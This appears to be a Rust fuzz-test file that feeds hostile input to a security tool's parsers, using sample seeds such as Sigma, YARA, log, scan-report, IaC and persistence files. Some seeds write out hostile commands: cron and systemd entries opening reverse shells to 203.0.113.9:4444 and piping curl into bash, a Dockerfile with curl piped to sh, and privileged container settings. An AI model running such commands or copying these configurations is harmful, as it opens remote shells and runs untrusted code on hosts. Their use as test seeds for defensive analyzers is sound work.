// SPDX-License-Identifier: Apache-2.0
//! Every parser of untrusted input through the hostile-input harness (`hostile.rs`): truncations
//! and seeded mutations of a valid file, random bytes, hostile text, oversized lines and deep
//! nesting. A parser may refuse anything; it must not panic, overflow its stack or hang.
//!
//! The seeds are small generated files, never real data. Parsers that read the network or the
//! file system take their text here (their entry points for pasted or picked content).

use std::time::Duration;

use crate::hostile::{deep_structures, hostile_text, mutations, noise, oversized, sweep, truncations, Case};

/// Generous for a debug build on a loaded CI runner; a hang takes far longer.
const BUDGET: Duration = Duration::from_secs(30);

fn text(d: &[u8]) -> String {
    String::from_utf8_lossy(d).into_owned()
}

/// Every hostile case for one seed, plus the format-independent ones.
fn cases_for(seeds: &[&[u8]], seed: u64) -> Vec<Case> {
    let mut out = Vec::new();
    for (i, s) in seeds.iter().enumerate() {
        for mut c in truncations(s).into_iter().chain(mutations(s, seed + i as u64, 64)) {
            c.name = format!("seed {i}, {}", c.name);
            out.push(c);
        }
    }
    out.extend(noise(seed));
    out.extend(hostile_text());
    out.extend(oversized());
    out.extend(deep_structures(100_000));
    out
}

const SIGMA: &str = "title: Suspicious shell\nid: 6f4e3b4a-7c1d-4e2f-9a8b-1c2d3e4f5a6b\nstatus: test\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n        CommandLine|contains|all: ['-enc', 'bypass']\n    filter:\n        User|re: '^SYSTEM$'\n    condition: selection and not filter\nlevel: high\ntags: [attack.t1059.001]\n";
const CORRELATION: &str = "title: Burst\nid: 5f4e3b4a-7c1d-4e2f-9a8b-1c2d3e4f5a6c\ncorrelation:\n    type: value_count\n    rules: [a, b]\n    group-by: [Host, User]\n    timespan: 10m\n    condition:\n        field: Ip\n        gte: 3\n        lt: 100\n    aliases:\n        Host:\n            a: Computer\n            b: host.name\n";
const YARA: &str = "import \"pe\"\nrule demo : tag1 {\n  meta:\n    severity = \"high\"\n  strings:\n    $a = \"evil\" wide ascii nocase\n    $b = { 4D 5A ?? 00 [2-4] 50 45 }\n    $c = /ab+c[0-9]{2,4}/\n  condition:\n    uint16(0) == 0x5A4D and ($a or $b) and #c < 10 and pe.number_of_sections > 0\n}\n";
const JSON_EVENTS: &str = "{\"@timestamp\":\"2026-11-09T10:00:00Z\",\"winlog\":{\"channel\":\"Security\",\"event_id\":4625,\"event_data\":{\"TargetUserName\":\"admin\",\"IpAddress\":\"203.0.113.9\"}}}\n{\"Records\":[{\"eventTime\":\"2026-11-09T10:00:01Z\",\"eventName\":\"ConsoleLogin\",\"userIdentity\":{\"arn\":\"arn:aws:iam::1:user/a\"}}]}\n";
const AUTH_LOG: &str = "Nov  9 10:00:00 host sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 50000 ssh2\nNov  9 10:00:05 host sshd[123]: Accepted publickey for alice from 198.51.100.7 port 50001 ssh2\n203.0.113.9 - - [09/Nov/2026:10:00:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 12 \"-\" \"sqlmap/1.7\"\n";
const NESSUS: &str = "<?xml version=\"1.0\"?><NessusClientData_v2><Report name=\"r\"><ReportHost name=\"10.0.0.5\"><HostProperties><tag name=\"host-ip\">10.0.0.5</tag></HostProperties><ReportItem port=\"443\" svc_name=\"www\" protocol=\"tcp\" severity=\"3\" pluginID=\"1\" pluginName=\"TLS\"><description>d</description><solution>s</solution><cve>CVE-2021-44228</cve><cvss3_base_score>9.8</cvss3_base_score></ReportItem></ReportHost></Report></NessusClientData_v2>";
const BURP: &str = "<?xml version=\"1.0\"?><issues burpVersion=\"2024.1\"><issue><serialNumber>1</serialNumber><type>1</type><name>XSS</name><host ip=\"10.0.0.5\">https://app.example</host><path>/a</path><location>/a [q]</location><severity>High</severity><confidence>Firm</confidence><issueDetail>&lt;b&gt;x&lt;/b&gt;</issueDetail></issue></issues>";
const NMAP: &str = "<?xml version=\"1.0\"?><nmaprun scanner=\"nmap\"><host><status state=\"up\"/><address addr=\"10.0.0.5\" addrtype=\"ipv4\"/><hostnames><hostname name=\"a.example\"/></hostnames><ports><port protocol=\"tcp\" portid=\"22\"><state state=\"open\"/><service name=\"ssh\" product=\"OpenSSH\" version=\"8.9\"/></port></ports></host></nmaprun>";
const NUCLEI: &str = "{\"template-id\":\"tech-detect\",\"info\":{\"name\":\"Tech\",\"severity\":\"info\",\"classification\":{\"cve-id\":[\"CVE-2021-44228\"]}},\"host\":\"https://app.example\",\"matched-at\":\"https://app.example/a\",\"type\":\"http\"}\n";
const SARIF: &str = "{\"version\":\"2.1.0\",\"runs\":[{\"tool\":{\"driver\":{\"name\":\"semgrep\",\"rules\":[{\"id\":\"r1\",\"shortDescription\":{\"text\":\"SQLi\"},\"properties\":{\"security-severity\":\"8.1\",\"tags\":[\"security\"]}}]}},\"results\":[{\"ruleId\":\"r1\",\"ruleIndex\":0,\"level\":\"error\",\"message\":{\"text\":\"m\"},\"locations\":[{\"physicalLocation\":{\"artifactLocation\":{\"uri\":\"src/a.py\"},\"region\":{\"startLine\":3}}}]}]}]}";
const OCSF: &str = "[{\"class_uid\":2003,\"status_code\":\"FAIL\",\"severity\":\"High\",\"finding_info\":{\"title\":\"S3 public\",\"uid\":\"u1\",\"desc\":\"d\"},\"resources\":[{\"uid\":\"arn:aws:s3:::b\",\"type\":\"AwsS3Bucket\",\"region\":\"eu-west-1\"}],\"remediation\":{\"desc\":\"fix\",\"references\":[\"https://docs.example\",\"aws s3api put-public-access-block\"]},\"metadata\":{\"product\":{\"name\":\"Prowler\"}}}]";
const CSV: &str = "Title,Severity,Host,Description\n\"SQL injection\",High,app.example,\"a, b\"\nXSS,Medium,10.0.0.5,\"multi\nline\"\n";
const CYCLONEDX: &str = "{\"bomFormat\":\"CycloneDX\",\"specVersion\":\"1.5\",\"metadata\":{\"component\":{\"name\":\"app\",\"version\":\"1\"}},\"components\":[{\"type\":\"library\",\"name\":\"lodash\",\"version\":\"4.17.20\",\"purl\":\"pkg:npm/lodash@4.17.20\",\"bom-ref\":\"a\",\"components\":[{\"type\":\"library\",\"name\":\"x\",\"version\":\"1\"}]}],\"dependencies\":[{\"ref\":\"a\",\"dependsOn\":[]}],\"vulnerabilities\":[{\"id\":\"CVE-2021-23337\",\"ratings\":[{\"score\":7.2,\"severity\":\"high\"}],\"affects\":[{\"ref\":\"a\"}]}]}";
const CYCLONEDX_XML: &str = "<?xml version=\"1.0\"?><bom xmlns=\"http://cyclonedx.org/schema/bom/1.5\"><components><component type=\"library\"><name>lodash</name><version>4.17.20</version><purl>pkg:npm/lodash@4.17.20</purl></component></components></bom>";
const SPDX_TV: &str = "SPDXVersion: SPDX-2.3\nDataLicense: CC0-1.0\nDocumentName: app\nPackageName: lodash\nPackageVersion: 4.17.20\nExternalRef: PACKAGE-MANAGER purl pkg:npm/lodash@4.17.20\n";
const PACKAGE_LOCK: &str = "{\"name\":\"app\",\"lockfileVersion\":3,\"packages\":{\"\":{\"dependencies\":{\"lodash\":\"^4\"}},\"node_modules/lodash\":{\"version\":\"4.17.20\",\"resolved\":\"https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz\",\"integrity\":\"sha512-x\"}}}";
const CARGO_LOCK: &str = "version = 3\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"ab\"\ndependencies = [\"serde_derive\"]\n";
const PNPM_LOCK: &str = "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      lodash:\n        specifier: ^4\n        version: 4.17.20\npackages:\n  lodash@4.17.20:\n    resolution: {integrity: sha512-x}\n";
const YARN_LOCK: &str = "# yarn lockfile v1\n\nlodash@^4:\n  version \"4.17.20\"\n  resolved \"https://registry.yarnpkg.com/lodash/-/lodash-4.17.20.tgz\"\n";
const GEMFILE_LOCK: &str = "GEM\n  remote: https://rubygems.org/\n  specs:\n    rails (7.0.4)\n      rack (~> 2.0)\n    rack (2.2.4)\n\nDEPENDENCIES\n  rails\n";
const OPENAPI: &str = "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers: [{url: 'https://api.example/v1'}]\npaths:\n  /users/{id}:\n    parameters: [{name: id, in: path, required: true, schema: {type: integer}}]\n    post:\n      security: [{bearer: []}]\n      requestBody:\n        content:\n          application/json:\n            schema: {$ref: '#/components/schemas/U'}\ncomponents:\n  securitySchemes: {bearer: {type: http, scheme: bearer}}\n  schemas:\n    U: {type: object, properties: {name: {type: string}}, allOf: [{$ref: '#/components/schemas/U'}]}\n";
const POSTMAN: &str = "{\"info\":{\"name\":\"c\",\"schema\":\"https://schema.getpostman.com/json/collection/v2.1.0/collection.json\"},\"variable\":[{\"key\":\"base\",\"value\":\"https://api.example\"}],\"item\":[{\"name\":\"f\",\"item\":[{\"name\":\"r\",\"request\":{\"method\":\"POST\",\"url\":{\"raw\":\"{{base}}/users/:id?x=1\"},\"body\":{\"mode\":\"raw\",\"raw\":\"{\\\"a\\\":1}\"}}}]}]}";
const HAR: &str = "{\"log\":{\"version\":\"1.2\",\"entries\":[{\"request\":{\"method\":\"GET\",\"url\":\"https://api.example/a?x=1\",\"headers\":[{\"name\":\"Authorization\",\"value\":\"Bearer abc\"}],\"queryString\":[{\"name\":\"x\",\"value\":\"1\"}]},\"response\":{\"status\":200}}]}}";
const TERRAFORM: &str = "resource \"aws_s3_bucket\" \"b\" {\n  bucket = \"x\"\n  acl    = \"public-read\"\n  dynamic \"rule\" {\n    for_each = var.rules\n    content { id = rule.value }\n  }\n}\nresource \"aws_security_group\" \"s\" {\n  ingress { cidr_blocks = [\"0.0.0.0/0\"] from_port = 22 to_port = 22 }\n}\n";
const CLOUDFORMATION: &str = "{\"AWSTemplateFormatVersion\":\"2010-09-09\",\"Resources\":{\"B\":{\"Type\":\"AWS::S3::Bucket\",\"Properties\":{\"AccessControl\":\"PublicRead\"}},\"R\":{\"Type\":\"AWS::IAM::Policy\",\"Properties\":{\"PolicyDocument\":{\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}}}}}";
const DOCKERFILE: &str = "FROM ubuntu:latest AS build\nENV API_KEY=abc123\nARG TOKEN\nRUN curl http://x | sh\nUSER root\nEXPOSE 22 80/tcp\nADD https://example/x.tgz /x\nFROM scratch\nCOPY --from=build /x /x\n";
const K8S: &str = "apiVersion: apps/v1\nkind: Deployment\nmetadata: {name: d}\nspec:\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: c\n          image: nginx\n          securityContext: {privileged: true, runAsUser: 0}\n          volumeMounts: [{name: v, mountPath: /host}]\n      volumes: [{name: v, hostPath: {path: /}}]\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1\nroleRef: {kind: ClusterRole, name: cluster-admin}\nsubjects: [{kind: ServiceAccount, name: default, namespace: default}]\n";
const COMPOSE: &str = "services:\n  web:\n    image: nginx\n    privileged: true\n    ports: ['22:22']\n    environment: [PASSWORD=x]\n    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n";
const CRONTAB: &str = "* * * * * root curl -s http://198.51.100.7/x | bash\n@reboot nc -e /bin/sh 203.0.113.9 4444\n";
const SYSTEMD: &str = "[Unit]\nDescription=x\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
const SUDOERS: &str = "alice ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/find\n%wheel ALL=(ALL) ALL\nDefaults !authenticate\n";
const OSINT_JSON: &str = r#"{"format":"cyberhub-osint-graph","version":1,"investigation":{"name":"x","targetType":"domain","targetValue":"a.com"},"graph":{"name":"g"},"entities":[{"id":"1","type":"domain","value":"a.com"},{"id":"2","type":"ip","value":"192.0.2.1"}],"relationships":[{"source":"1","target":"2","type":"RESOLVES_TO"}]}"#;
const GRAPHML: &str = "<?xml version=\"1.0\"?><graphml><key id=\"t\" for=\"node\" attr.name=\"type\"/><graph edgedefault=\"directed\"><node id=\"1\"><data key=\"t\">domain</data></node><node id=\"2\"><data key=\"t\">ip</data></node><edge source=\"1\" target=\"2\"/></graph></graphml>";
const IAM: &str = "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:*\",\"iam:PassRole\"],\"Resource\":\"*\",\"Condition\":{\"StringEquals\":{\"aws:SourceAccount\":\"1\"}}},{\"Effect\":\"Allow\",\"NotAction\":\"iam:*\",\"NotResource\":\"arn:aws:iam::*:role/x\",\"Principal\":\"*\"}]}";

/// A minimal ELF64 header (no sections): goblin reads it, and its mutations reach the section
/// and program header code.
fn elf() -> Vec<u8> {
    let mut e = vec![0u8; 64];
    e[..4].copy_from_slice(b"\x7fELF");
    e[4] = 2; // 64-bit
    e[5] = 1; // little-endian
    e[6] = 1;
    e[16] = 2; // executable
    e[18] = 0x3e; // x86-64
    e[20] = 1;
    e[52] = 64; // header size
    e
}

#[test]
fn detection_parsers_survive_hostile_input() {
    sweep("yaml", cases_for(&[SIGMA.as_bytes(), K8S.as_bytes(), PNPM_LOCK.as_bytes()], 1), BUDGET, |d| {
        let _ = crate::yaml::parse_documents(&text(d));
    });
    sweep("sigma", cases_for(&[SIGMA.as_bytes(), CORRELATION.as_bytes()], 2), BUDGET, |d| {
        let _ = crate::detection::sigma::read(&text(d));
    });
    sweep("yara", cases_for(&[YARA.as_bytes()], 3), BUDGET, |d| {
        let _ = crate::detection::yara::check(&text(d));
    });
    sweep("events", cases_for(&[JSON_EVENTS.as_bytes(), AUTH_LOG.as_bytes()], 4), BUDGET, |d| {
        let _ = crate::detection::events::read(d);
    });
    let evtx = crate::sectools::evtx::tests::sample();
    sweep("evtx", cases_for(&[&evtx], 5), BUDGET, |d| {
        let _ = crate::sectools::evtx::read(d, |_| {});
        let _ = crate::detection::events::read(d);
        let _ = crate::sectools::winevents::analyze(d);
    });
}

#[test]
fn capture_log_and_binary_parsers_survive_hostile_input() {
    let frames = crate::sectools::pcap::tests::frames();
    let pcap = crate::sectools::pcap::tests::pcap_file(&frames);
    let pcapng = crate::sectools::pcap::tests::pcapng_file(&frames);
    sweep("pcap", cases_for(&[&pcap, &pcapng], 6), BUDGET, |d| {
        let _ = crate::sectools::pcap::analyze(d);
    });
    sweep("logs", cases_for(&[AUTH_LOG.as_bytes()], 7), BUDGET, |d| {
        let _ = crate::sectools::logs::analyze(d);
    });
    sweep("binary", cases_for(&[&elf(), b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"], 8), BUDGET, |d| {
        let _ = crate::sectools::binary::analyze(d);
    });
    sweep("linux persistence", cases_for(&[CRONTAB.as_bytes(), SYSTEMD.as_bytes(), SUDOERS.as_bytes()], 9), BUDGET, |d| {
        let t = text(d);
        for (path, hint) in [("/etc/crontab", "cron"), ("/etc/systemd/system/x.service", "systemd"), ("/etc/sudoers", "sudoers"), ("/etc/passwd", "passwd"), ("/home/a/.bashrc", "")] {
            let _ = crate::sectools::linux_persist::analyze(path, &t, hint);
        }
    });
}

#[test]
fn import_parsers_survive_hostile_input() {
    let seeds: Vec<&[u8]> = [NESSUS, BURP, NMAP, NUCLEI, SARIF, OCSF, CSV].iter().map(|s| s.as_bytes()).collect();
    sweep("scan import", cases_for(&seeds, 10), BUDGET, |d| {
        let t = text(d);
        let _ = crate::workspace::scan_import::detect(&t);
        let _ = crate::workspace::scan_import::parse(&t);
    });
    sweep("sbom", cases_for(&[CYCLONEDX.as_bytes(), CYCLONEDX_XML.as_bytes(), SPDX_TV.as_bytes()], 11), BUDGET, |d| {
        let _ = crate::workspace::sbom::parse(&text(d));
    });
    sweep("lockfiles", cases_for(&[PACKAGE_LOCK.as_bytes(), CARGO_LOCK.as_bytes(), PNPM_LOCK.as_bytes(), YARN_LOCK.as_bytes(), GEMFILE_LOCK.as_bytes()], 12), BUDGET, |d| {
        let t = text(d);
        for name in ["package-lock.json", "Cargo.lock", "go.sum", "requirements.txt", "poetry.lock", "Gemfile.lock", "composer.lock", "pnpm-lock.yaml", "yarn.lock", "Pipfile.lock"] {
            let _ = crate::workspace::lockfiles::parse(name, &t);
        }
    });
    sweep("api specs", cases_for(&[OPENAPI.as_bytes(), POSTMAN.as_bytes(), HAR.as_bytes()], 13), BUDGET, |d| {
        let _ = crate::workspace::apisec::parse(&text(d));
    });
    sweep("osint import", cases_for(&[OSINT_JSON.as_bytes(), GRAPHML.as_bytes()], 14), BUDGET, |d| {
        let _ = crate::osint::io::parse(d, "json");
        let _ = crate::osint::io::parse(d, "graphml");
    });
}

#[test]
fn infrastructure_parsers_survive_hostile_input() {
    sweep("iac", cases_for(&[TERRAFORM.as_bytes(), CLOUDFORMATION.as_bytes(), K8S.as_bytes()], 15), BUDGET, |d| {
        let t = text(d);
        for (file, hint) in [("main.tf", ""), ("template.json", ""), ("stack.yaml", ""), ("x", "terraform")] {
            let _ = crate::sectools::iac::analyze(file, &t, hint);
        }
    });
    sweep("containers", cases_for(&[DOCKERFILE.as_bytes(), K8S.as_bytes(), COMPOSE.as_bytes()], 16), BUDGET, |d| {
        let t = text(d);
        for (file, hint) in [("Dockerfile", ""), ("deploy.yaml", ""), ("compose.yaml", ""), ("x", "dockerfile")] {
            let _ = crate::sectools::containers::analyze(file, &t, hint);
        }
    });
    sweep("iam", cases_for(&[IAM.as_bytes()], 17), BUDGET, |d| {
        if let Ok(v) = serde_json::from_slice::<serde_json::Value>(d) {
            let _ = crate::sectools::iam::is_policy(&v);
            let _ = crate::sectools::iam::check("policy.json", &v, Some("1"));
        }
    });
    sweep("cvss", cases_for(&[b"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", b"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:A"], 18), BUDGET, |d| {
        let _ = crate::cvss::parse(&text(d));
    });
}

#[test]
fn command_line_and_protocol_inputs_survive_hostile_input() {
    // arguments of a tool run: every hostile text as an argument after a target, for each tool
    // whose redirect options are read
    sweep("redirect options", cases_for(&[b"-r -u https://app.example/ --redirects", b"-kr --follow-redirects=false -F"], 19), BUDGET, |d| {
        let t = text(d);
        let args: Vec<String> = t.split_whitespace().map(str::to_string).chain([t.clone()]).collect();
        for tool in ["ffuf", "feroxbuster", "dalfox", "gobuster", "nuclei", "katana", "httpx", "curl", "wget", "sqlmap", "nikto", "wfuzz", "zap"] {
            let _ = crate::redirects::follows(tool, &args);
        }
    });
    // STIX indicators from a TAXII feed: the pattern reader and the object reader
    sweep("stix patterns", cases_for(&[b"[ipv4-addr:value = '8.8.4.4'] OR [url:value = 'https://a.example.net/x\'y']", b"[file:hashes.'SHA-256' = 'aa']"], 21), BUDGET, |d| {
        let t = text(d);
        let _ = crate::ti::taxii::pattern_values(&t);
        if let Ok(v) = serde_json::from_slice::<serde_json::Value>(d) {
            let _ = crate::ti::taxii::indicator(&v);
        }
        let _ = crate::ti::taxii::indicator(&serde_json::json!({ "type": "indicator", "id": "indicator--1", "pattern": t, "modified": "x" }));
    });
    // MCP: the proof a client sends before it is authenticated
    sweep("mcp proof", cases_for(&[b"00ff10ab"], 20), BUDGET, |d| {
        let _ = crate::mcp::proto::verify(b"0123456789abcdef0123456789abcdef", "client", "a", "b", &text(d));
    });
}
